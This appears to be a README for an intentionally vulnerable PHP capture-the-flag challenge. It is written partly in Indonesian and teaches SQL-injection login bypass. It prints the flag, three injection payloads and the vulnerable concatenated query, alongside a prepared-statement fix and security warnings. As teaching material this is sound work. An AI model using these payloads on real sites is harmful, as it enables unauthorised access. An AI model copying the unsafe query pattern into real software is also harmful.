# InjeksiBY

🔥 **Phoenix CTF - SQL Injection Challenge by InjeksiBY** 🔥

## Overview

Selamat datang di InjeksiBY - Challenge CTF yang fokus pada SQL Injection dan Web Security vulnerabilities. Repository ini berisi challenge web PHP yang rentan terhadap SQL injection dengan tampilan modern dan memukau.

## Challenge: SQL Injection Bypass

**Flag:** `PHXCTF{1Njeksi_Byp44as}`

Challenge web dengan PHP dan MySQL yang rentan terhadap SQL injection. Peserta harus mengeksploitasi vulnerability untuk bypass autentikasi dan mendapatkan akses admin.

### Teknologi
- PHP 7.4+
- MySQL/MariaDB
- Modern responsive design dengan animasi stunning
- SQL Injection vulnerability (intentional)

### Features

✨ **Ultra Modern UI/UX Design**
- Animated gradients yang smooth
- Particle effects floating
- Beautiful transitions dan hover effects
- Responsive layout untuk semua device
- Eye-catching color schemes

🎯 **Educational Purpose**
- Learn SQL injection techniques
- Understand authentication bypass
- Practice ethical hacking
- Learn secure coding practices

🔐 **Security Concepts**
- SQL injection exploitation
- Input validation importance
- Prepared statements
- Password hashing weaknesses

---

## Quick Start

### Setup Requirements
- PHP 7.4 or higher
- MySQL/MariaDB server
- Web server (Apache/Nginx) atau PHP built-in server

### Installation

1. **Clone the repository**
```bash
git clone https://github.com/jonalexanderhere/InjeksiBY.git
cd InjeksiBY/web_challenge_sqli
```

2. **Configure Database**
- Database akan otomatis dibuat saat pertama kali diakses
- Default config di `config.php`:
  - Host: localhost
  - User: root
  - Password: (empty)
  - Database: phoenix_ctf

3. **Start PHP Server**
```bash
php -S localhost:8000
```

4. **Access Challenge**
```
http://localhost:8000
```

---

## How to Solve

### Method 1: Classic SQL Injection

**Payload:**
```
Username: ' OR '1'='1' -- 
Password: (anything)
```

### Method 2: Comment-based Injection

**Payload:**
```
Username: admin' -- 
Password: (anything)
```

### Method 3: Always True Condition

**Payload:**
```
Username: admin' OR '1'='1
Password: (anything)
```

### Explanation

Vulnerable code in `login.php`:
```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '" . md5($password) . "'";
```

Payload `' OR '1'='1' --` akan membuat query menjadi:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'
```

Ini akan selalu return TRUE dan bypass authentication!

---

## File Structure

```
web_challenge_sqli/
├── index.php          # Home page dengan intro challenge
├── login.php          # Vulnerable login page (SQL injection)
├── register.php       # User registration (secure)
├── dashboard.php      # User dashboard
├── admin.php          # Admin dashboard (FLAG HERE!)
├── profile.php        # User profile page
├── logout.php         # Logout handler
├── config.php         # Database configuration
├── style.css          # Ultra modern stylesheet
└── README.md          # Challenge documentation
```

---

## Features Detail

### 🎨 Modern Design Elements

1. **Animated Background**
   - Gradient shifting animation
   - Particle floating effects
   - Smooth color transitions

2. **Interactive UI**
   - Hover effects on all elements
   - Smooth form animations
   - Button glow effects
   - Card elevation on hover

3. **Flag Reveal Animation**
   - Special animation untuk flag
   - Glow effect
   - Pulse animation
   - Celebration design

4. **Responsive Layout**
   - Mobile-friendly
   - Tablet optimized
   - Desktop enhanced
   - Smooth breakpoints

---

## Learning Objectives

### What You'll Learn

1. **SQL Injection Basics**
   - How SQL injection works
   - Different injection techniques
   - Payload construction

2. **Authentication Bypass**
   - Using SQL injection to bypass login
   - Comment-based injection
   - Boolean-based injection

3. **Secure Coding**
   - Why prepared statements matter
   - Input validation importance
   - Proper password hashing

4. **Web Security**
   - Common vulnerabilities
   - OWASP Top 10
   - Security best practices

---

## Vulnerability Details

### The Vulnerable Code

**Location:** `login.php` line 19

```php
// VULNERABLE - DO NOT USE IN PRODUCTION
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '" . md5($password) . "'";
```

**Why it's vulnerable:**
- Direct string concatenation
- No input sanitization
- No prepared statements
- Allows SQL injection

### The Secure Way

```php
// SECURE - Use in production
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $hashed_password);
$stmt->execute();
$result = $stmt->get_result();
```

**Why it's secure:**
- Uses prepared statements
- Separates SQL code from data
- Prevents SQL injection
- Parameterized queries

---

## Screenshots & Demo

### Homepage
- Welcome message dengan challenge info
- Beautiful gradient background
- Animated elements
- Call-to-action buttons

### Login Page
- Modern form design
- Input validation hints
- SQL injection testing tips
- Smooth animations

### Admin Dashboard
- Flag reveal with animation
- User management table
- Statistics display
- Exploit explanation

---

## Deployment Options

### Option 1: Local Development
```bash
php -S localhost:8000
```

### Option 2: XAMPP/WAMP/MAMP
1. Copy folder ke `htdocs`
2. Access via `http://localhost/web_challenge_sqli`

### Option 3: Docker
```dockerfile
FROM php:7.4-apache
RUN docker-php-ext-install mysqli
COPY . /var/www/html/
```

### Option 4: VPS/Hosting
1. Upload files to server
2. Configure database
3. Update config.php
4. Set proper permissions

---

## Security Notes

⚠️ **IMPORTANT WARNING**

This application is **INTENTIONALLY VULNERABLE** for educational purposes!

**Never deploy this to production!**

### Vulnerabilities Included:
- ❌ SQL injection (intentional)
- ❌ MD5 password hashing (weak)
- ❌ No rate limiting
- ❌ No CSRF protection
- ❌ Verbose error messages

### For Production, Always:
- ✅ Use prepared statements
- ✅ Use strong password hashing (bcrypt/argon2)
- ✅ Implement rate limiting
- ✅ Add CSRF tokens
- ✅ Sanitize all inputs
- ✅ Use HTTPS
- ✅ Implement proper error handling

---

## Flag

Once you successfully exploit the SQL injection and access the admin dashboard:

**🎉 FLAG: `PHXCTF{1Njeksi_Byp44as}` 🎉**

---

## Contributing

Contributions are welcome! To contribute:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## Troubleshooting

### Database Connection Error
```php
// Check config.php and update credentials
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', 'your_password');
```

### Permission Denied
```bash
chmod 755 web_challenge_sqli/
chmod 644 web_challenge_sqli/*.php
```

### Port Already in Use
```bash
# Use different port
php -S localhost:8080
```

---

## Additional Resources

### Learn More About SQL Injection:
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PHP Prepared Statements](https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php)

### CTF Resources:
- [HackTheBox](https://www.hackthebox.eu/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)

---

## Credits

**Created by: InjeksiBY**

- GitHub: [@jonalexanderhere](https://github.com/jonalexanderhere)
- Repository: [InjeksiBY](https://github.com/jonalexanderhere/InjeksiBY)
- Challenge: Phoenix CTF SQL Injection

### Special Thanks:
- OWASP for security education
- CTF community for inspiration
- Web security researchers worldwide

---

## License

This project is for **educational purposes only**.

⚠️ Use responsibly and ethically. Do not use these techniques on systems you don't own or have permission to test.

---

## Support

Need help or found a bug?

- 🐛 [Open an Issue](https://github.com/jonalexanderhere/InjeksiBY/issues)
- 💬 Contact via GitHub
- 📧 Check repository discussions

---

## Disclaimer

This challenge is designed for **educational and training purposes only**. The vulnerabilities are intentional to teach about web security. The creator is not responsible for any misuse of this code.

**Always practice ethical hacking!**

---

**Happy Hacking! 🔥**

Made with ❤️ for security education by InjeksiBY